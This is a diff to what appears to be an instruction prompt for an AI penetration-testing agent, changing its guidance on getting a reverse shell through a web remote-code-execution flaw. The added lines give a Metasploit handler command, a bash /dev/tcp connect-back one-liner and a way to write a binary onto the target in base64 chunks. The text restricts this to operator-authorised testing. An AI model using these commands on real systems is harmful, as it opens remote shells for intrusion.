@@ -588,7 +588,16 @@ Critical-impact proofs (Level 4). Pick the MINIMUM viable proof; do not chain.
 ```
 
 **Reverse shell (only if explicitly requested by operator):**
-- Generate via `msfvenom` in kali_shell, host via chisel/ngrok if behind NAT
+- In a web RCE you have NO session yet and the target cannot fetch from your sandbox or the
+  chat card, so do not try to stage a binary. Fire a one-line connect-back straight through
+  the RCE and catch it on a matching handler. Take LHOST/LPORT from the "Pre-Configured
+  Payload Settings" block (never a hardcoded port); your tunnel, if any, is RedAmon-managed
+  (do NOT start chisel/ngrok yourself). Example:
+  - handler: `use exploit/multi/handler; set payload cmd/unix/reverse_bash; set LHOST <LHOST>; set LPORT <LPORT>; run -j`
+    (WITH A TUNNEL also `set ReverseListenerBindAddress 127.0.0.1; set ReverseListenerBindPort 4444`).
+  - inject through the RCE: `bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1`.
+- If you must drop a real binary (no shell one-liner lands), write it THROUGH the RCE in
+  printf/base64 chunks, then `chmod +x` and run it on the target — never host it for fetch.
 - Use `set ExitOnSession false` so the handler stays available
 - IMMEDIATELY take a screenshot of `id;uname -a;hostname` from the shell, then
   background it. Do NOT explore filesystem or move laterally without authorization.
